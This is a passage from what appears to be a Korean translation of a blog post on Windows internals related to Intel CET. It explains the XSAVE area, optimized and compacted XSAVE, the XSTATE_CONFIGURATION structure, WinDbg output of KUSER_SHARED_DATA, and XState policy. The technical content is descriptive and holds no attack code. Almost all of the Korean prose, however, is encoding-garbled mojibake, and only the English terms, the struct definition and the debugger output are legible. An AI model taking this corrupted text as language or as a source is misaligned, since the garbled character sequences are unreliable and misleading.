ë„ì›€ì´ë˜ê¸°ë¥¼ ë°”ë€ë‹¤. ë˜í•œ <a href="https://github.com/yardenshafir/cet-research">ê´€ë ¨ GitHub ì €ì¥ì†Œ</a>ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•¨ìˆ˜ ì´ë¦„ì„ í´ë¦­í•˜ë©´ ìƒˆë¡œ ë„ì…ëœ ë‹¤ì–‘í•œ í•¨ìˆ˜ì— ëŒ€í•œ ì£¼ì„ì´ ë‹¬ë¦° ì†ŒìŠ¤ ì½”ë“œë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.</p><h1 id="XState-ë‚´ë¶€"><a href="#XState-ë‚´ë¶€" class="headerlink" title="XState ë‚´ë¶€"></a>XState ë‚´ë¶€</h1><p>x86-x64 ì•„í‚¤í…ì²˜ í´ë˜ìŠ¤ í”„ë¡œì„¸ì„œëŠ” ë²”ìš© ë ˆì§€ìŠ¤í„°(RAX, RCX), ì œì–´ ë ˆì§€ìŠ¤í„° (RIP, RSPâ€¦), ë¶€ë™ ì†Œìˆ˜ì  ë ˆì§€ìŠ¤í„° (XMM, YMM, ZMM)ì™€ ì¼ë¶€ ì œì–´, ë””ë²„ê·¸ ë° í…ŒìŠ¤íŠ¸ ë ˆì§€ìŠ¤í„° ë“± ëŒ€ë¶€ë¶„ì˜ ë³´ì•ˆ ì—°êµ¬ìë“¤ì—ê²Œ ìµìˆ™í•œ ë ˆì§€ìŠ¤í„° ì„¸íŠ¸ë¡œ êµ¬ì„±ë˜ì—ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë” ë§ì€ í”„ë¡œì„¸ì„œ ê¸°ëŠ¥ì´ ì¶”ê°€ë¨ì— ë”°ë¼ ìƒˆ ë ˆì§€ìŠ¤í„° ë° ì´ëŸ¬í•œ ê¸°ëŠ¥ê³¼ ê´€ë ¨ëœ íŠ¹ì • í”„ë¡œì„¸ì„œ ìƒíƒœë¥¼ ì •ì˜í•´ì•¼ í–ˆë‹¤. ê·¸ë¦¬ê³  ì´ëŸ¬í•œ ê¸°ëŠ¥ ì¤‘ ë§ì€ ë¶€ë¶„ì´ ìŠ¤ë ˆë“œ ë‚´ë¶€ì—ì„œ ì‚¬ìš©í•˜ë¯€ë¡œ ì½˜í…ìŠ¤íŠ¸ ì „í™˜ ì¤‘ì— ì €ì¥í•˜ê³  ë³µì›í•´ì•¼ í•œë‹¤.</p><p>ì´ì— ëŒ€í•œ í•´ê²°ì±…ìœ¼ë¡œ ì¸í…”ì€ ë‹¤ì–‘í•œ í”„ë¡œì„¸ì„œ ìƒíƒœë¥¼ <code>ìƒíƒœ ë§ˆìŠ¤í¬</code>ì˜ ë¹„íŠ¸ì™€ ì—°ê²°í•˜ê³  <code>XSAVE</code> ì˜ì—­ì—ì„œ ìš”ì²­ëœ ìƒíƒœë¥¼ ì½ê³  ì“°ê¸° ìœ„í•œ <code>XSAVE</code> ë° <code>XRSTOR</code>ì™€ ê°™ì€ ëª…ë ¹ì–´ë¥¼ ë„ì…í•˜ëŠ” <code>XState(eXtended State)</code> <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developers-manual.pdf">í‘œì¤€</a>ì„ ì •ì˜í–ˆë‹¤. ì´ ì˜ì—­ì€ ê° ìŠ¤ë ˆë“œì— ëŒ€í•œ CET ë ˆì§€ìŠ¤í„° ì €ì¥ì†Œì˜ ì¤‘ìš”í•œ ë¶€ë¶„ì´ì§€ë§Œ ëŒ€ë¶€ë¶„ì˜ ì‚¬ëŒë“¤ì€ ê¸°ì¡´ ë¶€ë™ ì†Œìˆ˜ì , AVX ë° <a href="https://software.intel.com/en-us/articles/introduction-to-intel-memory-protection-extensions">ë©”ëª¨ë¦¬ ë³´í˜¸ í™•ì¥(Memory Protection eXtensions, MPX)</a> ê¸°ëŠ¥ì— ì´ˆì ì„ ë‘ì—ˆê¸° ë•Œë¬¸ì— XSAVE ì§€ì›ì„ ëŒ€ë¶€ë¶„ ë¬´ì‹œí•˜ê³  ìˆë‹¤. ê¸°ëŠ¥ ë° ë©”ëª¨ë¦¬ ë ˆì´ì•„ì›ƒì— ëŒ€í•œ ê°œìš”ëŠ” ë…ìì—ê²Œ ë„ì›€ì´ ë  ê²ƒì´ë‹¤.</p><h2 id="XSAVE-ì˜ì—­"><a href="#XSAVE-ì˜ì—­" class="headerlink" title="XSAVE ì˜ì—­"></a>XSAVE ì˜ì—­</h2><p>ì•ì„œ ì–¸ê¸‰í–ˆë“¯ì´ XSAVE ì˜ì—­ì€ ì›ë˜ Intelì—ì„œ í”„ë¡œì„¸ì„œì— ì¶”ê°€ í•œ AVXì™€ ê°™ì€ ìƒˆë¡œìš´ ë¶€ë™ ì†Œìˆ˜ì  ê¸°ëŠ¥ ì¤‘ ì¼ë¶€ë¥¼ ì €ì¥í•˜ê³  ì´ì „ì— <code>FXSTOR</code> ë° <code>FXRSTR</code> ëª…ë ¹ì„ í†µí•´ ì €ì¥ë˜ëŠ” ê¸°ì¡´ x86 FPU ë° SSE ìƒíƒœë¥¼ í†µí•©í•˜ëŠ” ë° ì‚¬ìš©ë˜ì—ˆë‹¤. ì´ ì²˜ìŒ ë‘ ê°œì˜ ë ˆê±°ì‹œ ìƒíƒœëŠ” <code>ë ˆê±°ì‹œ XSAVE ì˜ì—­</code>ì˜ ì¼ë¶€ë¡œ ì •ì˜ë˜ì—ˆìœ¼ë©° ì¶”ê°€ í”„ë¡œì„¸ì„œ ë ˆì§€ìŠ¤í„° (ì˜ˆ : AVX)ëŠ” <code>í™•ì¥ëœ XSAVE ì˜ì—­</code>ì— ì¶”ê°€ë˜ì—ˆë‹¤. ê·¸ ì‚¬ì´ì— <code>XSAVE ì˜ì—­ í—¤ë”</code> ëŠ” <code>XSTATE_BV</code>ë¼ëŠ” ìƒíƒœ ë§ˆìŠ¤í¬ë¥¼ í†µí•´ ì–´ë–¤ í™•ì¥ ê¸°ëŠ¥ì´ ìˆëŠ”ì§€ ì„¤ëª…í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤.</p><p>ë™ì‹œì— XSAVE ê¸°ëŠ¥ì˜ ì¼ë¶€ë¡œ ìš´ì˜ì²´ì œì—ì„œ ì§€ì›í•˜ëŠ” ìƒíƒœë¥¼ ì •ì˜í•˜ëŠ” ìƒˆë¡œìš´ <code>XCR0(eXtended Control Register)</code>ê°€ ì¶”ê°€ë˜ì—ˆìœ¼ë©° XCR0ì„ êµ¬ì„±í•˜ê¸° ìœ„í•´ <code>XGETBV</code> ë° <code>XSETBV</code> ëª…ë ¹ì´ ì¶”ê°€ë˜ì—ˆë‹¤. (ì´í›„ì— ì¶”ê°€ë  <code>XCR</code>ë„ ë§ˆì°¬ê°€ì§€ì´ë‹¤.) ì˜ˆë¥¼ ë“¤ì–´ ìš´ì˜ì²´ì œëŠ” x87 FPU ë° SSEì— ëŒ€í•œ ê¸°ëŠ¥ ìƒíƒœ ë¹„íŠ¸ë¥¼ í¬í•¨í•˜ì§€ ì•Šë„ë¡, ì¦‰ ë ˆê±°ì‹œ <code>FXSTOR</code> ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜ë™ìœ¼ë¡œ ì €ì¥í•˜ê³  í™•ì¥ëœ ê¸°ëŠ¥ì˜ ìƒíƒœë§Œ XSAVE ì˜ì—­ì— ì €ì¥í•˜ë„ë¡ XCR0ì„ í”„ë¡œê·¸ë˜ë°í•´ ì„ íƒí•  ìˆ˜ ìˆë‹¤.</p><p><code>PKRU(Protection Key Register User State)</code>ë¥¼ ì¶”ê°€í•œ  <a href="https://www.kernel.org/doc/html/latest/core-api/protection-keys.html">MPK(Memory Protection Key)</a>ì™€ ê°™ì€ ê³ ê¸‰ ë ˆì§€ìŠ¤í„° ì„¸íŠ¸ ë° ê¸°ëŠ¥ì˜ ìˆ˜ê°€ ì¦ê°€í•¨ì— ë”°ë¼ ìµœì‹  í”„ë¡œì„¸ì„œëŠ” <code>XSAVES</code> ë° <code>XRSRTORS</code>ë¥¼ ì‚¬ìš©í•˜ëŠ” CPL0 ì½”ë“œë¡œë§Œ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ìŠˆí¼ë°”ì´ì € ìƒíƒœì™€ ì••ì¶• ë° ìµœì í™” ë²„ì „ (<code>XSAVEC</code> / <code>XSAVEOPT</code>)ìœ¼ë¡œ êµ¬ë¶„í•´ ì¸í…”ë§Œì˜ ë°©ì‹ìœ¼ë¡œ ë³µì¡í•˜ê²Œ ë§Œë“¤ì—ˆë‹¤. ìŠˆí¼ë°”ì´ì € ì „ìš© ìƒíƒœë¥¼ ì •ì˜í•˜ê¸° ìœ„í•´ <code>IA32_XSS</code>ë¼ëŠ” ìƒˆë¡œìš´ <code>MSR(Model Specific Register)</code>ì´ ì¶”ê°€ë˜ì—ˆë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/1.png"></p><blockquote><p>optimized XSAVE ì˜ì—­ vs not optimized XSAVE ì˜ì—­<br>(VX ë° CET_Uê°€ ë…¸íŠ¸ í™œì„±í™”ë˜ê³  IPT ë° PKRUê°€ í™œì„±í™”ë˜ì—ˆì§€ë§Œ ë§ˆì§€ë§‰ ì½˜í…ìŠ¤íŠ¸ ì „í™˜ ì´í›„ì— ì‚¬ìš©ë˜ì§€ ì•Šì€ ìŠ¤ë ˆë“œ)</p></blockquote><p><code>Optimized XSAVE</code> ë©”ì»¤ë‹ˆì¦˜ì€ ë§ˆì§€ë§‰ ì½˜í…ìŠ¤íŠ¸ ìŠ¤ìœ„ì¹˜ (ìˆëŠ” ê²½ìš°) ì´í›„ ë‹¤ë¥¸ ìŠ¤ë ˆë“œì— ì˜í•´ ì‹¤ì œë¡œ ìˆ˜ì •ëœ í”„ë¡œì„¸ì„œ ìƒíƒœë§Œ XSAVEì˜ì—­ì— ê¸°ë¡í•  ìˆ˜ ìˆê²Œ í•´ ì£¼ë©° ë‚´ë¶€ í”„ë¡œì„¸ì„œ ë ˆì§€ìŠ¤í„°ëŠ” <code>XINUSE</code>ì´ ì •ë³´ë¥¼ ì¶”ì í•  ìˆ˜ ìˆê²Œ í•´ ì¤€ë‹¤. <code>XSAVEOPT</code>ë¥¼ ì‚¬ìš©í•  ë•Œ <code>XSTATE_BV</code> ë§ˆìŠ¤í¬ëŠ” ìš”ì²­ëœ ëª¨ë“  ìƒíƒœê°€ ì•„ë‹ˆë¼ ì‹¤ì œë¡œ ì €ì¥ëœ ìƒíƒœì— í•´ë‹¹í•˜ëŠ” ë¹„íŠ¸ë§Œ í¬í•¨ëœë‹¤.</p><p>ë°˜ë©´ <code>Compacted XSAVE</code> ë©”ì»¤ë‹ˆì¦˜ì€ ê¸°ì¡´ XState ë””ìì¸ì˜ ê²°í•¨ì„ ìˆ˜ì •í–ˆë‹¤. <code>AVX512</code> ë° <a href="https://software.intel.com/content/www/us/en/develop/blogs/processor-tracing.html">IPT(Intel Processor Trace)</a>ì™€ ê°™ì€ ë” ë§ì€ í™•ì¥ ê¸°ëŠ¥ì´ ì¶”ê°€ë¨ì— ë”°ë¼ ì´ëŸ¬í•œ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì§€ ì•Šìœ¼ë©´ í° XSAVEì˜ì—­ì„ í• ë‹¹í•˜ê³  0ìœ¼ë¡œ ê¸°ë¡í•´ì•¼ í•œë‹¤. <code>Optimized XSAVE</code>ëŠ” ì´ëŸ¬í•œ ë‚­ë¹„ë¥¼ í”¼í•  ìˆ˜ ìˆì§€ë§Œ ì—¬ì „íˆ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” í™•ì¥ ê¸°ëŠ¥ì€ ê¸°ë³¸ XSAVE ì˜ì—­ ë²„í¼ë¡œë¶€í„° í° ì˜¤í”„ì…‹ì— ìˆìŒì„ ì˜ë¯¸í•œë‹¤.</p><p><code>XSAVEC</code>ë¥¼ ì‚¬ìš©í•˜ë©´ í˜„ì¬ ìŠ¤ë ˆë“œì— ì˜í•´ ì‹¤ì œë¡œ í™œì„±í™”ëœ XState ê¸°ëŠ¥ì„ ì €ì¥í•˜ê¸° ìœ„í•œ ê³µê°„ë§Œ ì‚¬ìš©í•˜ê³  ì €ì¥ëœ ê° ìƒíƒœë¥¼ ìˆœì°¨ì ìœ¼ë¡œ ë©”ëª¨ë¦¬ì— ë°°ì¹˜í•¨ìœ¼ë¡œì¨ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆë‹¤. (CPUIDë¥¼ í†µí•´ <code>ì •ë ¬ ë§ˆìŠ¤í¬</code>ì˜ ì¼ë¶€ë¡œ ì œê³µë˜ëŠ” ê³ ì • 64-byte ì •ë ¬ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.)</p><p>ì´ì „ì— í‘œì‹œëœ XSAVE ì˜ì—­ í—¤ë”ëŠ” ë‘ ë²ˆì§¸ ìƒíƒœ ë§ˆìŠ¤í¬ì¸ <code>XCOMP_BV</code>ë¡œ í™•ì¥ë˜ì–´ ìš”ì²­ëœ ìƒíƒœ ë¹„íŠ¸ ì¤‘ ì–´ëŠ ê²ƒì´ ë¹„êµ ì˜ì—­ì— ìˆì„ ìˆ˜ ìˆëŠ”ì§€ ë‚˜íƒ€ë‚¸ë‹¤. <code>XSTATE_BV</code>ì™€ ë‹¬ë¦¬ ì´ ë§ˆìŠ¤í¬ëŠ” <code>XINUSE</code>ì˜ ì¼ë¶€ê°€ ì•„ë‹Œ ìƒíƒœ ë¹„íŠ¸ë¥¼ ìƒëµí•˜ì§€ ì•Šì•„ ì••ì¶•ë  ìˆ˜ ìˆëŠ” ëª¨ë“  ê°€ëŠ¥í•œ ë¹„íŠ¸ë¥¼ í¬í•¨í•˜ë¯€ë¡œ <code>XSTATE_BV</code>ë¥¼ í†µí•´ ì‹¤ì œë¡œ ì–´ë–¤ ìƒíƒœ ì˜ì—­ì´ ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•œë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ, ì••ì¶•ëœ ëª…ë ¹ì–´ê°€ ì‚¬ìš©ë  ë•Œ ë¹„íŠ¸ 63ì€ í•­ìƒ <code>XCOMP_BV</code>ì—ì„œ XSAVE ì˜ì—­ì— ëŒ€í•œ ì§€ì‹œìë¡œ ì„¤ì •ëœë‹¤.</p><p>ë”°ë¼ì„œ ì••ì¶•ëœ í¬ë§·ì¸ì§€ì— ë”°ë¼ XSAVE ì˜ì—­ì˜ ë‚´ë¶€ ë ˆì´ì•„ì›ƒê³¼ í¬ê¸°ê°€ ê²°ì •ëœë‹¤. ì••ì¶•ëœ í¬ë§·ì€ ìŠ¤ë ˆë“œì—ì„œ ì‚¬ìš©í•˜ëŠ” í”„ë¡œì„¸ì„œ ê¸°ëŠ¥ì— ëŒ€í•´ì„œë§Œ XSAVE ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³ , ì••ì¶•ë˜ì§€ ì•Šì€ í¬ë§·ì€ í”„ë¡œì„¸ì„œê°€ ì§€ì›í•˜ëŠ” ëª¨ë“  í”„ë¡œì„¸ì„œ ê¸°ëŠ¥ì— ëŒ€í•´ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³  ìŠ¤ë ˆë“œì—ì„œ ì‚¬ìš©í•˜ëŠ” ê¸°ëŠ¥ë§Œ ì‚¬ìš©í•œë‹¤. ì•„ë˜ ë‹¤ì´ì–´ê·¸ë¨ì€ ë™ì¼í•œ ìŠ¤ë ˆë“œì— ëŒ€í•´ XSAVE ì˜ì—­ì´ ì–´ë–»ê²Œ ë³´ì´ëŠ”ì§€, ê°ê°ì˜ í¬ë§·ì„ ì‚¬ìš©í•  ë•Œì˜ ì˜ˆë¥¼ ë³´ì—¬ì¤€ë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/2.png"></p><blockquote><p>Compacted XSAVE vs not Compacted XSAVE AVX ë° CET_Uê°€ í™œì„±í™”ë˜ì§€ ì•Šì€ ìŠ¤ë ˆë“œ, ì´ëŸ¬í•œ ê¸°ëŠ¥ì„ ì§€ì›í•˜ëŠ” í”„ë¡œì„¸ì„œì—ì„œ ì‹¤í–‰ë¨</p></blockquote><p>ìš”ì•½í•˜ìë©´,  <code>XSAVE</code>ì™€ <code>XRSTOR</code> ëª…ë ¹ì–´ ì§‘í•©ì€ ë‹¤ìŒê³¼ ê°™ì€ ì¡°í•©ê³¼ í•¨ê»˜ ì‚¬ìš©ëœë‹¤.</p><ol><li>OSê°€ XCR0ì„ ì§€ì›í•  ë•Œ ì„¤ì •ë˜ëŠ” ìƒíƒœ ë¹„íŠ¸ (<code>XSETBV</code> ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¤ì •)</li><li><code>XSAVE</code> ëª…ë ¹ì„ ì‚¬ìš©í•  ë•Œ í˜¸ì¶œìê°€ EDX : EAXì— ì €ì¥í•˜ëŠ” ìƒíƒœ ë¹„íŠ¸ (ì¸í…”ì—ì„œëŠ” ì´ë¥¼ <code>instruction mask</code>ë¼ê³  í•¨)</li><li>ê¶Œí•œì´ ì—†ëŠ” ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš° <code>IA32_XSS</code>ì— ì„¤ì •ë˜ì§€ ì•Šì€ ìƒíƒœ ë¹„íŠ¸</li><li><code>XINUSE</code>ì— ì„¤ì •ëœ ìƒíƒœ ë¹„íŠ¸ì¸ <code>ìµœì í™”ëœ XSAVE</code>ë¥¼ ì§€ì›í•˜ëŠ” í”„ë¡œì„¸ì„œì—ì„œ ë§ˆì§€ë§‰ ì „í™˜ ì´í›„ í˜„ì¬ ìŠ¤ë ˆë“œì—ì„œ ì‚¬ìš©ëœ ì‹¤ì œ XState ê´€ë ¨ ë ˆì§€ìŠ¤í„°ë¥¼ ì¶”ì í•˜ëŠ” ë‚´ë¶€ ë ˆì§€ìŠ¤í„°</li></ol><p>ì´ëŸ¬í•œ ë¹„íŠ¸ê°€ í•¨ê»˜ ë§ˆìŠ¤í‚¹ë˜ë©´ <code>XSAVE</code> ëª…ë ¹ì— ì˜í•´ <code>XSTATE_BV</code> í•„ë“œì˜ XSAVE ì˜ì—­ì˜ í—¤ë”ì— ìµœì¢… ìƒíƒœ ë¹„íŠ¸ê°€ ê¸°ë¡ëœë‹¤. <code>Compacted XSAVE</code>ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš° <code>XINUSE</code>ë¥¼ ìƒëµí•œ ê²°ê³¼ ìƒíƒœ ë¹„íŠ¸ê°€  <code>XCOMP_BV</code> í•„ë“œì— XSAVE ì˜ì—­ì˜ í—¤ë”ì— ê¸°ë¡ëœë‹¤. ì•„ë˜ ë‹¤ì´ì–´ê·¸ë¨ì€ ê²°ê³¼ ë§ˆìŠ¤í¬ë¥¼ ë³´ì—¬ì¤€ë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/3.png"></p><h2 id="XState-êµ¬ì„±"><a href="#XState-êµ¬ì„±" class="headerlink" title="XState êµ¬ì„±"></a>XState êµ¬ì„±</h2><p>ê° í”„ë¡œì„¸ì„œì—ëŠ” ìì²´ì ì¸ XState í™œì„±í™” ê¸°ëŠ¥, ì˜ˆìƒë˜ëŠ” í¬ê¸°, ê¸°ëŠ¥ ë° ë©”ì»¤ë‹ˆì¦˜ ì„¸íŠ¸ë¥¼ ê°€ì§€ê³  ìˆì–´ Intelì€ ìš´ì˜ ì²´ì œê°€ XStateë¥¼ ì²˜ë¦¬í•  ë•Œ ì¿¼ë¦¬ í•´ì•¼ í•˜ëŠ” ë‹¤ì–‘í•œ CPUID í´ë˜ìŠ¤ë¥¼ í†µí•´ ì •ë³´ë¥¼ ë…¸ì¶œí•œë‹¤. WindowsëŠ” ë¶€íŒ… ì‹œ ì´ëŸ¬í•œ ì¿¼ë¦¬ë¥¼ ìˆ˜í–‰í•˜ê³  <code>XSTATE_CONFIGURATION</code> ì•„ë˜ì— í‘œì‹œëœ êµ¬ì¡°ì— ì •ë³´ë¥¼ ì €ì¥í•œë‹¤. (Winnt.hì— ë¬¸ì„œí™”ë¨)</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSTATE_CONFIGURATION</span></span><span class="hljs-class">&#123;</span>    ULONG64 EnabledFeatures;    ULONG64 EnabledVolatileFeatures;    ULONG Size;    <span class="hljs-keyword">union</span>    &#123;        ULONG ControlFlags;        <span class="hljs-class"><span class="hljs-keyword">struct</span></span><span class="hljs-class">        &#123;</span>            ULONG OptimizedSave:<span class="hljs-number">1</span>;            ULONG CompactionEnabled:<span class="hljs-number">1</span>;        &#125;;    &#125;;    XSTATE_FEATURE Features[MAXIMUM_XSTATE_FEATURES];    ULONG64 EnabledSupervisorFeatures;    ULONG64 AlignedFeatures;    ULONG AllFeatureSize;    ULONG AllFeatures[MAXIMUM_XSTATE_FEATURES];    ULONG64 EnabledUserVisibleSupervisorFeatures;&#125; XSTATE_CONFIGURATION, *PXSTATE_CONFIGURATION;</code></pre><p>ì´ ë°ì´í„°ë“¤ì„ ë³´ê´€í•œ í›„ ì»¤ë„ì€ <code>KUSER_SHARED_DATA</code> êµ¬ì¡°ì²´ì— ì €ì¥í•œë‹¤. ì´ êµ¬ì¡°ì²´ëŠ” <code>SharedUserData</code> ë³€ìˆ˜ë¥¼ í†µí•´ ì•¡ì„¸ìŠ¤ í•  ìˆ˜ ìˆìœ¼ë©° ëª¨ë“  Windows í”Œë«í¼ì˜ <code>0x7FFE0000</code> ì£¼ì†Œì— ì¡´ì¬í•œë‹¤.</p><p>Optimized, Compacted XSAVEë¥¼ ëª¨ë‘ ì§€ì›í•˜ê³  x87 FPU(0), SSE(1), AVX(2) ë° MPX(3, 4) ê¸°ëŠ¥ ë¹„íŠ¸ë¥¼ ì§€ì›í•˜ëŠ” í…ŒìŠ¤íŠ¸ <code>19H1</code> ì‹œìŠ¤í…œì˜ ì¶œë ¥ì„ ì˜ˆë¡œ ë“¤ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs c">dx ((nt!_KUSER_SHARED_DATA*)<span class="hljs-number">0x7ffe0000</span>)-&gt;XState    [+<span class="hljs-number">0x000</span>] EnabledFeatures  : <span class="hljs-number">0x1f</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x008</span>] EnabledVolatileFeatures : <span class="hljs-number">0xf</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x010</span>] Size             : <span class="hljs-number">0x3c0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span>] ControlFlags     : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span> ( <span class="hljs-number">0</span>: <span class="hljs-number">0</span>)] OptimizedSave    : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span> ( <span class="hljs-number">1</span>: <span class="hljs-number">1</span>)] CompactionEnabled : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x018</span>] Features         [Type: _XSTATE_FEATURE [<span class="hljs-number">64</span>]]    [+<span class="hljs-number">0x218</span>] EnabledSupervisorFeatures : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x220</span>] AlignedFeatures  : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x228</span>] AllFeatureSize   : <span class="hljs-number">0x3c0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x22c</span>] AllFeatures      [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> [<span class="hljs-number">64</span>]]    [+<span class="hljs-number">0x330</span>] EnabledUserVisibleSupervisorFeatures : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>Features ë°°ì—´ì—ì„œ ë‹¤ìŒ 5ê°€ì§€ ê¸°ëŠ¥ì˜ í¬ê¸°ì™€ ì˜¤í”„ì…‹ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs c">dx -r2 (((nt!_KUSER_SHARED_DATA*)<span class="hljs-number">0x7ffe0000</span>)-&gt;XState)-&gt;Features.Take(<span class="hljs-number">5</span>)    [<span class="hljs-number">0</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0xa0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">1</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0xa0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x100</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">2</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x240</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x100</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">3</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x340</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x40</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">4</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x380</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x40</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]</code></pre><p>ì´ í¬ê¸°ë¥¼ í•©í•˜ë©´ ìœ„ì˜ <code>FeatureSize</code> í•„ë“œì— í‘œì‹œëœ ê°’ì¸ <code>0x3C0</code>ì´ ëœë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ì‹œìŠ¤í…œì€ <code>Compacted XSAVE</code> ê¸°ëŠ¥ì„ ì§€ì›í•˜ë¯€ë¡œ ì—¬ê¸°ì— í‘œì‹œëœ ì˜¤í”„ì…‹ì€ ê´€ë ¨ì´ ì—†ìœ¼ë©° ëª¨ë“  ê¸°ëŠ¥ì˜ í¬ê¸°ë¥¼ í¬í•¨í•˜ì§€ë§Œ ì˜¤í”„ì…‹ì€ í¬í•¨í•˜ì§€ ì•ŠëŠ” ì»¤ë„ì—ë§Œ ìœ ìš©í•˜ê²Œ ì‚¬ìš© ê°€ëŠ¥í•˜ë‹¤.(<code>XCOMP_BV</code>ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì••ì¶• ë§ˆìŠ¤í¬ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ê²°ì •ë˜ê¸° ë•Œë¬¸)</p><h2 id="XState-ì •ì±…"><a href="#XState-ì •ì±…" class="headerlink" title="XState ì •ì±…"></a>XState ì •ì±…</h2><p>í”„ë¡œì„¸ì„œê°€ XStateì„ ì§€ì›í•˜ì§€ë§Œ ë‹¤ì–‘í•œ í•˜ë“œì›¨ì–´ ì˜¤ë¥˜ ë•Œë¬¸ì— íŠ¹ì • í”„ë¡œì„¸ì„œê°€ ì´ ê¸°ëŠ¥ì„ ì œëŒ€ë¡œ ì§€ì›í•˜ì§€ ëª»í•˜ëŠ” ê²½ìš°ê°€ ì¢…ì¢… ë°œìƒí•œë‹¤. ì´ ë¬¸ì œë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ WindowsëŠ” ì¼ë°˜ì ìœ¼ë¡œ  ë¼ê³  í•˜ëŠ” í•˜ë“œì›¨ì–´ ì •ì±… ë“œë¼ì´ë²„ì¸ <code>HwPolicy.sys</code> ì˜ ë¦¬ì†ŒìŠ¤ ì„¹ì…˜ì— ì €ì¥ëœ XState ì •ì±…ì„ ì‚¬ìš©í•œë‹¤.</p><p>Intel x86 ì•„í‚¤í…ì²˜ëŠ” ì—¬ëŸ¬ í”„ë¡œì„¸ì„œ ë²¤ë” ì¤‘ í•˜ë‚˜ì´ë¯€ë¡œ ì»¤ë„ì€ XState ì •ì±…ì„ êµ¬ë¬¸ ë¶„ì„í•˜ê³  í˜„ì¬ í”„ë¡œì„¸ì„œì˜ ë²¤ë” ë¬¸ìì—´ ë° ë§ˆì´í¬ë¡œì½”ë“œ ë²„ì „ë¿ë§Œ ì•„ë‹ˆë¼ ì‹œê·¸ë‹ˆì²˜, ê¸°ëŠ¥ ë° í™•ì¥ ê¸°ëŠ¥ì„ ë¹„êµí•˜ê³  (ì¦‰, CPUID 01h ì¿¼ë¦¬ì˜ RAX, RDX ë° RCX), ì •ì±…ì—ì„œ ì¼ì¹˜í•˜ëŠ” 